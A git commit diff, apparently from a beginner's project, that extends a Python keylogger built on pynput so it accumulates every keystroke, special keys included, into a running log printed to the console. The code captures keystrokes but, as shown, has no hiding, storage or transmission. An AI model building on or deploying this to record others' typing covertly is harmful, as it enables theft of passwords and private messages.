121de0cd9849d2d5e99a89b11e3a5f45fc3f23f2
Saad-20 <m.saadshahzad@gmail.com>
2021-08-09 20:25:04 +0500

    Added functionality for logging special keys i.e. key.space

--- keylogger.py
+++ keylogger.py
@@ -1,9 +1,20 @@
 import pynput.keyboard as keyboard
 
+log = ""
+
 def callingBack(key):
- print(key)
+ global log 
+ try:
+  log = log + str(key.char)
+ except AttributeError:
+  if key == key.space:
+   log = log + " "
+  else:
+   log = log + " " + str(key) + " "
+ print(log)
 
 key_Listener = keyboard.Listener(on_press=callingBack)
 
 with key_Listener:
  key_Listener.join()
+#Key.backspace  Key.space  Key.enter  Key.up  Key.down  Key.left  Key.right  Key.ctrl  Key.cmd  Key.alt NoneNone Key.shift  Key.caps_lock  Key.caps_lock  Key.tab  Key.ctrl 
